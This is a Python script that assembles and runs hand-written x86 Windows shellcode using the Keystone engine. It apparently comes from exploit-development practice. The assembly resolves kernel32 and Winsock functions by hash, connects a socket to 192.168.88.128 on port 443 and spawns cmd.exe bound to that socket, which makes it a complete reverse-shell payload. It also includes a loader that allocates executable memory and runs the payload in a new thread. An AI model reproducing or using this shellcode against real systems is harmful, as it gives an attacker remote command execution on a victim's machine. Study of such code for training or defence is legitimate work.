from keystone import *
import sys
import ctypes, struct

def asm2shell(c):
    print("Generate shellcode ...")
    # Initialize engine in 32-bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(c)
    sh = b""
    instructions = ""
    for e in encoding: 
        sh += struct.pack("B",e)
        instructions += "\\x{0:02x}".format(int(e)).rstrip("\n") 
    print("Shellcode size: %d bytes"%(count))
    shellcode = bytearray(sh)
    print("Shellcode: %s"%instructions)
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

    print("Shellcode located at address %s" % hex(ptr))
    input("...ENTER TO EXECUTE SHELLCODE...")

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


code = "start:"
# Setup stack
code += "mov ebp, esp;"
code += "add esp, 0xfffff9f0 ;"
# Find_kernel32
code += "find_kernel32: "
code += "xor ecx, ecx;"
code += "mov esi, fs:[ecx + 0x30];" # PEB
code += "mov esi, [esi + 0x0c];" # PEB -> Ldr
code += "mov esi, [esi + 0x1c];" #PEB -> Ldr.InInitOrder
code += "next_module: "
code += "mov ebx, [esi + 0x8];" # InInitOrder[i].base_address
code += "mov edi, [esi + 0x20];" # InInitOrder[X].module_name
code += "mov esi, [esi];" # InInitOrder[X].flink
code += "cmp [edi + 12*2], cx;" # if module_name[12] == 0
code += "jne next_module;"

# find_function_shorten
code += "find_function_shorten:"
code += "jmp find_function_shorten_bnc;"
code += "find_function_ret:"
code += "pop esi;" # save ret address to esi
code += "mov [ebp + 0x4], esi;" # save ret address
code += "jmp resolve_symbols_kernel32;"
code += "find_function_shorten_bnc:"
code += "call find_function_ret;"

# find function
code += "find_function:"
code += "pushad;"
code += "mov eax, [ebx + 0x3c];" # PE Signature
code += "mov edi, [ebx + eax + 0x78];" # Directory RVA
code += "add edi, ebx;" # Directory VMA
code += "mov ecx, [edi + 0x18];" # NumberOfNames
code += "mov eax, [edi + 0x20];" # AddressOfNames RVA
code += "add eax, ebx;" # AddressOfNames VMA
code += "mov [ebp-4], eax;" # save AddressOfNames VMA
code += "find_function_loop:"
code += "jecxz find_function_finished;"
code += "add ecx, 0xffffffff;"
code += "mov eax, [ebp-4];"
code += "mov esi, [eax + ecx*4];" # Get the RVA of the symbol name
code += "add esi, ebx;"

# compute hash
code += "compute_hash:"
code += "xor eax, eax;" # clear eax
code += "cdq;" # clear edx
code += "cld;" # clear direaction? 
code += "compute_hash_again:"
code += "lodsb;" # load next byte from esi to al
code += "test al, al;"
code += "jz compute_hash_finished;"
code += "ror edx, 0x0d;"
code += "add edx, eax;"
code += "jmp compute_hash_again;"
code += "compute_hash_finished:"
code += "cmp edx, [esp + 0x24];"
code += "jnz find_function_loop;"
code += "mov edx, [edi + 0x24];"
code += "add edx, ebx;"
code += "mov cx, [edx + 2 * ecx];" 
code += "mov edx, [edi + 0x1c];"
code += "add edx, ebx;"
code += "mov eax, [edx + 4 * ecx];"
code += "add eax, ebx;"
code += "mov [esp + 0x1c], eax;"


code += "find_function_finished:"
code += "popad;"
code += "ret;"

#  resolve kernel32 symbol
code += "resolve_symbols_kernel32:"
code += "push 0x78b5b983;" # TerminateProcess
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x10], eax;" # save TerminateProcess 

code += "push 0xec0e4e8e;" # LoadLibraryA
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x14], eax;" # save LoadLibraryA

code += "push 0x16b3fe72;" # CreateProcessA
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x18], eax;" # save CreateProcessA

# call LoadLibraryA
code += "xor eax, eax;"
code += "mov ax, 0x6c6c;" # ll
code += "push eax;"
code += "mov eax, 0x642e3233;" # 32.d
code += "push eax;"
code += "mov eax, 0x5f327377;" # ws2_
code += "push eax;"
code += "push esp;"
code += "call [ebp + 0x14];"
code += "mov ebx, eax;"

# load WSAStartup 
code += "push 0x3bfcedcb; " # WSAStartup
code += "call dword ptr [ebp + 0x4];"
code += "mov [ebp + 0x1C], eax;"

# call WSAStartup
code += "mov eax, esp;"
code += "mov cx, 0x590;"
code += "sub eax, ecx;"
code += "push eax;"
code += "xor eax,eax;"
code += "mov ax, 0x0202;"
code += "push eax;"
code += "call dword ptr [ebp + 0x1C];"


# load WSASocketA
code += "push 0xadf509d9;"
code += "call dword ptr [ebp+0x4];"
code += "mov [ebp + 0x28], eax;"

# call WSASocketA
code += "xor eax, eax;"
code += "push eax;"
code += "push eax;"
code += "push eax;"
code += "mov al, 0x06;"
code += "push eax;"
code += "sub al, 0x05;"
code += "push eax;"
code += "inc eax;"
code += "push eax;"
code += "call dword ptr [ebp + 0x28];"
code += "mov esi, eax;" # save socket description

# load WSAConnect
code += "push 0xb32dba0c;"
code += "call dword ptr [ebp+0x4];"
code += "mov [ebp + 0x24], eax;"

# call WSAConnect
code += "xor eax, eax;"
code += "push eax;"
code += "push eax;"
code += "push 0x8058a8c0;" # 192.168.88.128
code += "mov bx, 0xbb01;" # port 443 
code += "shl ebx, 0x10;"
code += "mov eax, ebx;"
code += "add ax, 0x02;"
code += "push eax;"
code += "push esp;"
code += "pop edi;"
code += "xor eax, eax;"
code += "push eax;"
code += "push eax;"
code += "push eax;"
code += "push eax;"
code += "add al, 0x10;"
code += "push eax;"
code += "push edi;"
code += "push esi;"
code += "call [ebp+0x24];"

# call CreateProcessA
code += "   push  esi   ;"  #   Push hStdError
code += "   push  esi   ;"  #   Push hStdOutput
code += "   push  esi   ;"  #   Push hStdInput
code += "   xor   eax, eax  ;"  #   Null EAX   
code += "   push  eax   ;"  #   Push lpReserved2
code += "   push  eax   ;"  #   Push cbReserved2 & wShowWindow
code += "   mov   ax, 0x101  ;"  #   Move 0x80 to AL
code += "   dec eax;    "
code += "   push  eax   ;"  #   Push dwFlags
code += "   xor   eax, eax  ;"  #   Null EAX   
code += "   push  eax   ;"  #   Push dwFillAttribute
code += "   push  eax   ;"  #   Push dwYCountChars
code += "   push  eax   ;"  #   Push dwXCountChars
code += "   push  eax   ;"  #   Push dwYSize
code += "   push  eax   ;"  #   Push dwXSize
code += "   push  eax   ;"  #   Push dwY
code += "   push  eax   ;"  #   Push dwX
code += "   push  eax   ;"  #   Push lpTitle
code += "   push  eax   ;"  #   Push lpDesktop
code += "   push  eax   ;"  #   Push lpReserved
code += "   mov   al, 0x44  ;"  #   Move 0x44 to AL
code += "   push  eax   ;"  #   Push cb
code += "   push  esp   ;"  #   Push pointer to the STARTUPINFOA structure
code += "   pop   edi   ;"  #   Store pointer to STARTUPINFOA in EDI
code += " create_cmd_string: "  #
code += "   mov   eax, 0xff9a879b   ;"  #   Move 0xff9a879b into EAX
code += "   neg   eax   ;"  #   Negate EAX, EAX = 00657865
code += "   push  eax   ;"  #   Push part of the "cmd.exe" string
code += "   push  0x2e646d63;"  #   Push the remainder of the "cmd.exe" string
code += "   push  esp   ;"  #   Push pointer to the "cmd.exe" string
code += "   pop   ebx   ;"  #   Store pointer to the "cmd.exe" string in EBX
code += " call_createprocessa:   "  #
code += "   mov   edx, esp  ;"  
code += " mov eax, edx;"        #   Move ESP to EAX
code += "   xor   ecx, ecx  ;"  #   Null ECX
code += "   mov   cx, 0x390 ;"  #   Move 0x390 to CX
code += "   sub   eax, ecx  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
code += "   push  eax   ;"  #   Push lpProcessInformation
code += "   push  edi   ;"  #   Push lpStartupInfo
code += "   xor   eax, eax  ;"  #   Null EAX   
code += "   push  eax   ;"  #   Push lpCurrentDirectory
code += "   push  eax   ;"  #   Push lpEnvironment
code += "   push  eax   ;"  #   Push dwCreationFlags
code += "   inc   eax   ;"  #   Increase EAX, EAX = 0x01 (TRUE)
code += "   push  eax   ;"  #   Push bInheritHandles
code += "   dec   eax   ;"  #   Null EAX
code += "   push  eax   ;"  #   Push lpThreadAttributes
code += "   push  eax   ;"  #   Push lpProcessAttributes
code += "   push  ebx   ;"  #   Push lpCommandLine
code += "   push  eax   ;"  #   Push lpApplicationName
code += "   call dword ptr [ebp+0x18]   ;"  #   Call CreateProcessA
# call TerminateProccess
code += "push 0x11223344;" # uExitCode
code += "push 0xffffffff;" # hProcess
code += "call [ebp + 0x10];"

asm2shell(code)
